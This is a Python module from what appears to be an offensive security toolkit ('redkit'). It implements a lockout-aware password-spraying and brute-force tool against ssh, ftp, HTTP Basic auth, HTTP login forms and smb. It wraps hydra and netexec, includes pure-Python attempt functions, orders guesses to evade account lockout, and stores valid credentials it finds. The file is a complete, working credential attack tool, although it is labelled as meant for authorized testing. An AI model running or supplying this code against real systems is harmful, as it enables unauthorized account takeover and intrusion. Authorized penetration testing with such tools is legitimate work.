"""Password spraying / brute orchestrator (lockout-aware).

``access.cred_spray`` tries a small set of passwords across a set of users to
find valid credentials for a network service. It deliberately sprays in
*password-outer / user-inner* order (one password against every user before
moving to the next password) so that any single account only receives one
attempt per "round" -- the classic anti-lockout ordering.

Two execution strategies are supported and selected automatically:

* **External tool** (preferred when present and ``use_tool`` is true):
  ``hydra`` for ssh / ftp / http-get, ``netexec`` / ``crackmapexec`` for smb.
* **Pure-Python fallback** (always available for ssh/ftp/http): ``paramiko``
  for ssh (optional third-party -- skipped with a note if absent), ``ftplib``
  for ftp, and ``urllib`` for http-get (HTTP Basic auth) / http-post (form
  login with a baseline-diff heuristic).

Design invariants honoured here:

* No AI/LLM usage -- every decision is rule-based and deterministic.
* Pure standard library by default. ``paramiko`` is imported lazily inside a
  ``try/except ImportError`` so the module always imports and runs without it.
* Imports cleanly on Windows and Linux; no OS-specific calls at import time.
* Offline-first: wordlists come from the bundled data dir via
  :mod:`redkit.core.config`; nothing is ever downloaded.
* Safe defaults: bounded per-attempt timeouts, a capped thread pool, an overall
  attempt cap, and no destructive behaviour. For AUTHORIZED testing only.
"""
from __future__ import annotations

import base64
import socket
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from redkit.core import config
from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

# ---------------------------------------------------------------------------
# tuning constants (all conservative / bounded)
# ---------------------------------------------------------------------------
ATTEMPT_TIMEOUT = 8          # seconds per single network attempt
PREFLIGHT_TIMEOUT = 6        # seconds for the initial TCP reachability probe
MAX_ATTEMPTS = 10_000        # hard cap on users*passwords combinations
MAX_POOL = 16                # cap on concurrent in-flight attempts per round
TOOL_TIMEOUT_CAP = 900       # seconds; upper bound on an external tool run

# service -> default TCP port
DEFAULT_PORTS: Dict[str, int] = {
    "ssh": 22,
    "ftp": 21,
    "http-get": 80,
    "http-post": 80,
    "smb": 445,
}

# attempt outcome sentinels
VALID = "valid"
INVALID = "invalid"
ERROR = "error"


@register
class CredSpray(Module):
    """Lockout-aware credential spraying across ssh/ftp/http/smb."""

    name = "access.cred_spray"
    description = "Password spraying / brute orchestrator (lockout-aware)"
    phase = "access"
    options = [
        Option("target", help="host / IP (http URLs accepted for http-*)", required=True),
        Option(
            "service",
            help="service to spray",
            required=True,
            choices=["ssh", "ftp", "http-get", "http-post", "smb"],
        ),
        Option(
            "users",
            default="users-common.txt",
            help="bundled wordlist name, path to a file, or inline comma list",
        ),
        Option(
            "passwords",
            default="passwords-common.txt",
            help="bundled wordlist name, path to a file, or inline comma list",
        ),
        Option("port", default=0, help="target port (0 = service default)"),
        Option("delay", default=0, help="seconds to wait between attempts (forces sequential)"),
        Option("stop_on_success", default=True, help="stop after the first valid credential"),
        Option("path", default="/", help="request path/endpoint for http-get / http-post"),
        Option("use_tool", default=True, help="prefer hydra/netexec when available"),
    ]
    requires_tools = ["hydra", "netexec"]  # soft/optional external deps
    references = [
        "https://github.com/vanhauser-thc/thc-hydra",
        "https://www.netexec.wiki/",
        "https://owasp.org/www-community/attacks/Brute_force_attack",
    ]

    # ------------------------------------------------------------------ run
    def run(self, opts: Dict, ctx) -> Result:
        service = opts["service"]
        target = str(opts["target"]).strip()
        delay = max(0, int(opts["delay"]))
        stop_on_success = bool(opts["stop_on_success"])
        use_tool = bool(opts["use_tool"])
        path = opts["path"] or "/"
        if not path.startswith("/"):
            path = "/" + path

        # -- parse target (accept http URLs for the http-* services) ------
        host, port_from_url = _split_target(target)
        if not host:
            return Result(ok=False, summary=f"could not parse target '{target}'")
        port = int(opts["port"]) or port_from_url or DEFAULT_PORTS[service]

        # -- resolve user / password lists --------------------------------
        users = _resolve_list(opts["users"], "users-common.txt")
        passwords = _resolve_list(opts["passwords"], "passwords-common.txt")
        if not users:
            return Result(ok=False, summary="no users to spray (empty users list)")
        if not passwords:
            return Result(ok=False, summary="no passwords to spray (empty passwords list)")

        # -- enforce the overall attempt cap ------------------------------
        users, passwords, capped = _apply_cap(users, passwords)
        total = len(users) * len(passwords)
        ctx.console.info(
            f"spraying {service} on {host}:{port} -- "
            f"{len(users)} user(s) x {len(passwords)} password(s) = {total} attempt(s)"
        )
        if capped:
            ctx.console.warn(
                f"attempt count exceeded cap ({MAX_ATTEMPTS}); "
                f"password list trimmed to {len(passwords)} to stay within the cap"
            )
        if delay:
            ctx.console.info(f"pacing enabled: {delay}s between attempts (sequential)")

        # -- reachability pre-flight (avoids hammering a dead host) --------
        if not _preflight(host, port):
            return Result(
                ok=False,
                summary=f"{host}:{port} not reachable (TCP connect failed) -- check target/port",
            )

        # -- choose strategy ----------------------------------------------
        strategy, note = self._choose_strategy(service, use_tool, ctx)
        if note:
            ctx.console.info(note)
        if strategy is None:
            # nothing can run this service in the current environment
            return Result(ok=False, summary=note or f"no available method for '{service}'")

        # -- dispatch -----------------------------------------------------
        if strategy == "hydra":
            hits, stats = self._spray_hydra(
                ctx, host, port, service, users, passwords, path, delay, stop_on_success
            )
        elif strategy == "netexec":
            hits, stats = self._spray_netexec(
                ctx, host, port, users, passwords, stop_on_success
            )
        else:  # python
            hits, stats = self._spray_python(
                ctx, host, port, service, users, passwords, path, delay, stop_on_success
            )

        # -- persist findings ---------------------------------------------
        valid = self._record_hits(ctx, host, port, service, hits, strategy)

        artifact = _write_artifact(ctx, host, port, service, valid, stats, strategy)

        summary = (
            f"{len(valid)} valid credential(s) found on {service}://{host}:{port} "
            f"({stats.get('attempts', 0)} attempt(s), via {strategy})"
            if valid
            else f"no valid credentials found on {service}://{host}:{port} "
            f"({stats.get('attempts', 0)} attempt(s), via {strategy})"
        )
        ctx.engagement.add_note(summary)
        return Result(
            ok=True,
            summary=summary,
            data={
                "target": host,
                "port": port,
                "service": service,
                "strategy": strategy,
                "attempts": stats.get("attempts", 0),
                "errors": stats.get("errors", 0),
                "valid": valid,
            },
            artifacts=[artifact] if artifact else [],
        )

    # ---------------------------------------------------------- strategy
    def _choose_strategy(self, service: str, use_tool: bool, ctx) -> Tuple[Optional[str], str]:
        """Pick 'hydra', 'netexec', 'python', or None + an explanatory note."""
        if service == "smb":
            # No stdlib SMB auth -- netexec/crackmapexec is required.
            for tool in ("netexec", "nxc", "crackmapexec", "cme"):
                if ctx.runner.have(tool):
                    return "netexec", f"using {tool} for smb spraying"
            return (
                None,
                "smb spraying needs netexec (or crackmapexec) -- install one, "
                "e.g. 'pipx install netexec'",
            )

        if use_tool and service in ("ssh", "ftp", "http-get") and ctx.runner.have("hydra"):
            return "hydra", "using hydra for spraying"

        if service in ("http-get", "http-post"):
            return "python", "using pure-python http spraying (urllib)"

        if service == "ssh":
            if _paramiko() is not None:
                return "python", "using pure-python ssh spraying (paramiko)"
            # No paramiko: only hydra could help, and it is absent here.
            return (
                None,
                "ssh spraying needs either hydra or the 'paramiko' package "
                "(pip install paramiko) -- neither is available",
            )

        if service == "ftp":
            return "python", "using pure-python ftp spraying (ftplib)"

        return None, f"no available method for service '{service}'"

    # ------------------------------------------------------------ hydra
    def _spray_hydra(
        self,
        ctx,
        host: str,
        port: int,
        service: str,
        users: List[str],
        passwords: List[str],
        path: str,
        delay: int,
        stop_on_success: bool,
    ) -> Tuple[List[Dict], Dict]:
        """Wrap thc-hydra and parse its 'login: X password: Y' output."""
        hydra = ctx.runner.which("hydra")
        userfile = ctx.artifact_path("cred_spray_users.txt")
        passfile = ctx.artifact_path("cred_spray_pass.txt")
        _write_lines(userfile, users)
        _write_lines(passfile, passwords)

        argv: List[str] = [
            hydra,
            "-L", str(userfile),
            "-P", str(passfile),
            "-s", str(port),
            "-u",   # loop users inside passwords -> password-spray ordering
            "-I",   # ignore any previous restore file
        ]
        if stop_on_success:
            argv.append("-f")  # exit after first valid pair (per host)
        if delay > 0:
            # single task + wait time between connects to respect pacing
            argv += ["-t", "1", "-c", str(delay)]
        else:
            argv += ["-t", str(min(4, MAX_POOL))]

        argv.append(host)
        argv.append("http-get" if service == "http-get" else service)
        if service == "http-get":
            argv.append(path)

        attempts = len(users) * len(passwords)
        timeout = min(TOOL_TIMEOUT_CAP, 30 + attempts * (delay + 2))
        proc = ctx.runner.run(argv, timeout=timeout)
        if proc.timed_out:
            ctx.console.warn("hydra timed out; parsing whatever it produced")

        hits = _parse_hydra(proc.text, service)
        return hits, {"attempts": attempts, "errors": 0, "raw_rc": proc.returncode}

    # ---------------------------------------------------------- netexec
    def _spray_netexec(
        self,
        ctx,
        host: str,
        port: int,
        users: List[str],
        passwords: List[str],
        stop_on_success: bool,
    ) -> Tuple[List[Dict], Dict]:
        """Wrap netexec/crackmapexec smb and parse '[+] user:pass' lines."""
        tool = None
        for candidate in ("netexec", "nxc", "crackmapexec", "cme"):
            if ctx.runner.have(candidate):
                tool = ctx.runner.which(candidate)
                break
        userfile = ctx.artifact_path("cred_spray_users.txt")
        passfile = ctx.artifact_path("cred_spray_pass.txt")
        _write_lines(userfile, users)
        _write_lines(passfile, passwords)

        argv = [tool, "smb", host, "-u", str(userfile), "-p", str(passfile)]
        if port and port != DEFAULT_PORTS["smb"]:
            argv += ["--port", str(port)]

        attempts = len(users) * len(passwords)
        timeout = min(TOOL_TIMEOUT_CAP, 30 + attempts * 2)
        proc = ctx.runner.run(argv, timeout=timeout)
        if proc.timed_out:
            ctx.console.warn("netexec timed out; parsing partial output")

        hits = _parse_netexec(proc.text)
        if stop_on_success and len(hits) > 1:
            hits = hits[:1]
        return hits, {"attempts": attempts, "errors": 0, "raw_rc": proc.returncode}

    # ----------------------------------------------------------- python
    def _spray_python(
        self,
        ctx,
        host: str,
        port: int,
        service: str,
        users: List[str],
        passwords: List[str],
        path: str,
        delay: int,
        stop_on_success: bool,
    ) -> Tuple[List[Dict], Dict]:
        """Pure-python spraying with password-outer / user-inner ordering."""
        # per-service attempt callable: (user, password) -> VALID|INVALID|ERROR
        attempt, setup_err = self._make_attempt(ctx, host, port, service, path)
        if setup_err:
            ctx.console.warn(setup_err)
            return [], {"attempts": 0, "errors": 0, "note": setup_err}

        hits: List[Dict] = []
        attempts = 0
        errors = 0
        found = False
        # Sequential when the operator wants pacing; otherwise a capped pool.
        concurrent = delay == 0 and len(users) > 1
        pool = max(1, min(MAX_POOL, len(users)))

        for pw in passwords:
            if found and stop_on_success:
                break
            round_hits: List[Tuple[str, str]] = []

            if concurrent:
                with ThreadPoolExecutor(max_workers=pool) as ex:
                    futures = {ex.submit(attempt, u, pw): u for u in users}
                    for fut in futures:
                        u = futures[fut]
                        try:
                            outcome = fut.result()
                        except Exception:  # never let one attempt crash the run
                            outcome = ERROR
                        attempts += 1
                        if outcome == VALID:
                            round_hits.append((u, pw))
                        elif outcome == ERROR:
                            errors += 1
            else:
                for u in users:
                    try:
                        outcome = attempt(u, pw)
                    except Exception:
                        outcome = ERROR
                    attempts += 1
                    if outcome == VALID:
                        round_hits.append((u, pw))
                        if stop_on_success:
                            # stop this round early on a confirmed hit
                            for r in round_hits:
                                self._note_hit(ctx, r)
                            hits.extend({"username": r[0], "password": r[1]} for r in round_hits)
                            return hits, {"attempts": attempts, "errors": errors}
                    elif outcome == ERROR:
                        errors += 1
                    if delay:
                        time.sleep(delay)
                    # abort early if the host is clearly unusable
                    if errors and attempts == errors and attempts >= min(len(users), 5):
                        ctx.console.warn("every attempt errored -- aborting (host/service unusable)")
                        return hits, {"attempts": attempts, "errors": errors}

            for r in round_hits:
                self._note_hit(ctx, r)
                hits.append({"username": r[0], "password": r[1]})
                found = True

            # abort early if a whole round only produced errors
            if round_hits == [] and errors and attempts == errors:
                ctx.console.warn("every attempt errored -- aborting (host/service unusable)")
                break

        return hits, {"attempts": attempts, "errors": errors}

    def _note_hit(self, ctx, pair: Tuple[str, str]) -> None:
        ctx.console.good(f"valid credential: {pair[0]}:{pair[1] if pair[1] else '<empty>'}")

    # ------------------------------------------- per-service attempt makers
    def _make_attempt(self, ctx, host: str, port: int, service: str, path: str):
        """Return (callable, setup_error). callable(user, pw) -> outcome."""
        if service == "ssh":
            paramiko = _paramiko()
            if paramiko is None:
                return None, (
                    "paramiko not installed -- skipping ssh spray "
                    "(pip install paramiko, or install hydra)"
                )

            def _ssh(u: str, p: str) -> str:
                return _attempt_ssh(paramiko, host, port, u, p)

            return _ssh, None

        if service == "ftp":
            def _ftp(u: str, p: str) -> str:
                return _attempt_ftp(host, port, u, p)

            return _ftp, None

        if service == "http-get":
            base_status = _http_baseline_get(host, port, path)
            if base_status is None:
                return None, "http-get baseline request failed (host unreachable or path errors)"
            if base_status not in (401, 403):
                return None, (
                    f"http-get endpoint {path} returned {base_status} without auth -- "
                    "it is not HTTP-Basic protected, spraying is not meaningful"
                )

            def _hget(u: str, p: str) -> str:
                return _attempt_http_get(host, port, path, u, p)

            return _hget, None

        if service == "http-post":
            baseline = _http_baseline_post(host, port, path)
            if baseline is None:
                return None, "http-post baseline request failed (host unreachable or path errors)"

            def _hpost(u: str, p: str) -> str:
                return _attempt_http_post(host, port, path, u, p, baseline)

            return _hpost, None

        return None, f"unsupported service for python path: {service}"

    # ------------------------------------------------------- persistence
    def _record_hits(self, ctx, host, port, service, hits, strategy) -> List[Dict]:
        """Store creds/findings in the engagement and return a clean list."""
        valid: List[Dict] = []
        if hits:
            ctx.engagement.add_host(host)
            ctx.engagement.add_service(host, port, proto="tcp", service=service)
        for hit in hits:
            user = hit.get("username")
            pw = hit.get("password", "")
            ctx.engagement.add_cred(
                service=service,
                host=host,
                username=user,
                password=pw,
                source=f"access.cred_spray/{strategy}",
            )
            heuristic = service == "http-post"
            desc = (
                f"Valid {service} credentials for {user} on {host}:{port} "
                f"(discovered by password spraying via {strategy})."
            )
            if heuristic:
                desc += (
                    " NOTE: http-post result is heuristic (baseline-diff of the login "
                    "response) -- verify manually before relying on it."
                )
            ctx.engagement.add_finding(
                title=f"Valid {service} credentials: {user}",
                severity="high",
                host=host,
                description=desc,
                evidence=f"{user}:{pw}",
            )
            valid.append({"username": user, "password": pw, "host": host, "port": port})
        return valid


# ===========================================================================
# module-level helpers (kept pure / stdlib-only)
# ===========================================================================
def _paramiko():
    """Import paramiko lazily; return the module or None if unavailable."""
    try:
        import paramiko  # type: ignore
        return paramiko
    except Exception:  # ImportError or a broken optional install
        return None


def _split_target(target: str) -> Tuple[Optional[str], Optional[int]]:
    """Return (host, port_from_url). Accepts bare host/IP or an http(s) URL."""
    if not target:
        return None, None
    if "://" in target:
        parsed = urllib.parse.urlsplit(target)
        return (parsed.hostname or None), parsed.port
    # allow a bare host:port form too
    if target.count(":") == 1 and not target.replace(":", "").replace(".", "").isalpha():
        host, _, maybe_port = target.partition(":")
        try:
            return host or None, int(maybe_port)
        except ValueError:
            return target, None
    return target, None


def _resolve_list(value, default_name: str) -> List[str]:
    """Resolve a users/passwords option to a concrete list.

    Order of interpretation:
      1. empty  -> use the bundled default wordlist
      2. an existing file path (absolute/relative) -> read lines
      3. a bundled wordlist name -> read lines
      4. otherwise -> treat as an inline comma-separated list
    """
    if value is None or value == "":
        value = default_name
    value = str(value)

    # explicit file path
    try:
        p = Path(value)
        if p.is_file():
            return _read_lines(p)
    except OSError:
        pass

    # bundled wordlist by name (only when it looks like a filename, no commas)
    if "," not in value:
        try:
            wl = config.wordlist(value)
            if wl.is_file():
                return _read_lines(wl)
        except OSError:
            pass

    # inline comma list
    return [item.strip() for item in value.split(",") if item.strip()]


def _read_lines(path: Path) -> List[str]:
    """Read non-empty, non-comment lines from a wordlist file."""
    out: List[str] = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.rstrip("\r\n")
                if not line or line.lstrip().startswith("#"):
                    continue
                out.append(line)
    except OSError:
        return []
    # de-duplicate while preserving order
    seen = set()
    uniq: List[str] = []
    for item in out:
        if item not in seen:
            seen.add(item)
            uniq.append(item)
    return uniq


def _apply_cap(users: List[str], passwords: List[str]) -> Tuple[List[str], List[str], bool]:
    """Trim the lists so users*passwords stays within MAX_ATTEMPTS (hard cap)."""
    if len(users) * len(passwords) <= MAX_ATTEMPTS:
        return users, passwords, False
    # If the user list alone blows the budget, trim it first so the cap is truly
    # hard; otherwise keep every user and trim the password list.
    if len(users) > MAX_ATTEMPTS:
        users = users[:MAX_ATTEMPTS]
    per_user_budget = max(1, MAX_ATTEMPTS // max(1, len(users)))
    return users, passwords[:per_user_budget], True


def _write_lines(path: Path, lines: List[str]) -> None:
    try:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
    except OSError:
        pass


def _preflight(host: str, port: int) -> bool:
    """Quick TCP reachability probe so we do not hammer a dead host."""
    try:
        with socket.create_connection((host, port), timeout=PREFLIGHT_TIMEOUT):
            return True
    except OSError:
        return False


# ------------------------------------------------------- ssh / ftp attempts
def _attempt_ssh(paramiko, host: str, port: int, user: str, pw: str) -> str:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host,
            port=port,
            username=user,
            password=pw,
            timeout=ATTEMPT_TIMEOUT,
            banner_timeout=ATTEMPT_TIMEOUT,
            auth_timeout=ATTEMPT_TIMEOUT,
            allow_agent=False,
            look_for_keys=False,
        )
        return VALID
    except paramiko.AuthenticationException:
        return INVALID
    except paramiko.SSHException:
        # e.g. "No authentication methods available" / server closed connection.
        return INVALID
    except (socket.error, OSError, EOFError):
        return ERROR
    except Exception:
        return ERROR
    finally:
        try:
            client.close()
        except Exception:
            pass


def _attempt_ftp(host: str, port: int, user: str, pw: str) -> str:
    import ftplib  # stdlib; local import keeps top-level surface small

    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=ATTEMPT_TIMEOUT)
        ftp.login(user, pw)
        return VALID
    except ftplib.error_perm:
        # permanent error (5xx) -- bad username/password
        return INVALID
    except ftplib.all_errors:
        # OSError / EOFError / transient protocol errors that are not auth failures
        return ERROR
    except Exception:
        return ERROR
    finally:
        try:
            ftp.close()
        except Exception:
            pass


# --------------------------------------------------------- http attempts
def _http_scheme(port: int) -> str:
    return "https" if port == 443 else "http"


def _http_url(host: str, port: int, path: str) -> str:
    scheme = _http_scheme(port)
    default = 443 if scheme == "https" else 80
    hostpart = host if port == default else f"{host}:{port}"
    return f"{scheme}://{hostpart}{path}"


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Stop urllib from silently following redirects so we can see 30x codes."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: D401
        return None


def _http_opener() -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(
        _NoRedirect(),
        urllib.request.HTTPSHandler(context=_ssl_ctx()),
    )


def _http_do(url: str, headers: Optional[Dict] = None, data: Optional[bytes] = None):
    """Perform one request. Return (status, body_len) or None on connect error."""
    req = urllib.request.Request(url, data=data, headers=headers or {})
    opener = _http_opener()
    try:
        with opener.open(req, timeout=ATTEMPT_TIMEOUT) as resp:
            body = resp.read()
            return resp.getcode(), len(body)
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read()
        except Exception:
            body = b""
        return exc.code, len(body)
    except (urllib.error.URLError, socket.error, OSError, ssl.SSLError):
        return None


def _http_baseline_get(host: str, port: int, path: str) -> Optional[int]:
    """Return the status code of an unauthenticated GET (for protection check)."""
    res = _http_do(_http_url(host, port, path))
    return None if res is None else res[0]


def _attempt_http_get(host: str, port: int, path: str, user: str, pw: str) -> str:
    token = base64.b64encode(f"{user}:{pw}".encode("utf-8")).decode("ascii")
    res = _http_do(_http_url(host, port, path), headers={"Authorization": f"Basic {token}"})
    if res is None:
        return ERROR
    status = res[0]
    if 200 <= status < 300:
        return VALID
    if status in (401, 403):
        return INVALID
    if status >= 500:
        return ERROR
    # 3xx after auth (e.g. redirect to an app landing page) usually means success
    if 300 <= status < 400:
        return VALID
    return INVALID


# form field names sprayed simultaneously to cover common login forms
_POST_USER_FIELDS = ("username", "user", "login", "email", "userid")
_POST_PASS_FIELDS = ("password", "pass", "passwd", "pwd")


def _post_body(user: str, pw: str) -> bytes:
    fields = {f: user for f in _POST_USER_FIELDS}
    fields.update({f: pw for f in _POST_PASS_FIELDS})
    return urllib.parse.urlencode(fields).encode("utf-8")


def _http_baseline_post(host: str, port: int, path: str) -> Optional[Tuple[int, int]]:
    """POST a deliberately-invalid credential to fingerprint a failed login."""
    body = _post_body("redkit-invalid-user", "redkit-invalid-pass")
    return _http_do(
        _http_url(host, port, path),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=body,
    )


def _attempt_http_post(
    host: str, port: int, path: str, user: str, pw: str, baseline: Tuple[int, int]
) -> str:
    """Heuristic form login: compare the response against the failure baseline."""
    body = _post_body(user, pw)
    res = _http_do(
        _http_url(host, port, path),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=body,
    )
    if res is None:
        return ERROR
    base_status, base_len = baseline
    status, length = res
    if status >= 500:
        return ERROR
    # a different status code (esp. a redirect vs the baseline) is a strong signal
    if status != base_status:
        return VALID
    # otherwise compare body size; a materially different page suggests success
    threshold = max(50, int(base_len * 0.25))
    if abs(length - base_len) > threshold:
        return VALID
    return INVALID


# ----------------------------------------------------------- tool parsers
def _parse_hydra(text: str, service: str) -> List[Dict]:
    """Extract 'login: X   password: Y' pairs from hydra output."""
    hits: List[Dict] = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if "login:" not in line or "password:" not in line:
            continue
        try:
            after_login = line.split("login:", 1)[1]
            login_part, pass_part = after_login.split("password:", 1)
        except (IndexError, ValueError):
            continue
        user = login_part.strip()
        pw = pass_part.strip()
        key = (user, pw)
        if user and key not in seen:
            seen.add(key)
            hits.append({"username": user, "password": pw})
    return hits


def _parse_netexec(text: str) -> List[Dict]:
    """Extract 'user:password' pairs from netexec/crackmapexec [+] lines."""
    hits: List[Dict] = []
    seen = set()
    for line in text.splitlines():
        if "[+]" not in line:
            continue
        # strip color codes and everything up to the [+]
        segment = line.split("[+]", 1)[1].strip()
        # trim trailing status markers such as (Pwn3d!)
        segment = segment.split("(")[0].strip()
        if ":" not in segment:
            continue
        creds = segment.rsplit(":", 1)
        user_field = creds[0].strip()
        pw = creds[1].strip()
        # user_field may be DOMAIN\user
        user = user_field.split("\\")[-1] if "\\" in user_field else user_field
        key = (user, pw)
        if user and key not in seen:
            seen.add(key)
            hits.append({"username": user, "password": pw})
    return hits


# --------------------------------------------------------------- artifact
def _write_artifact(ctx, host, port, service, valid, stats, strategy) -> Optional[str]:
    """Persist a small JSON summary of the run; return its path (or None)."""
    import json

    try:
        path = ctx.artifact_path(f"cred_spray_{service}_{host}_{port}.json".replace(":", "_"))
        payload = {
            "target": host,
            "port": port,
            "service": service,
            "strategy": strategy,
            "stats": stats,
            "valid": valid,
        }
        path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
        return str(path)
    except OSError:
        return None
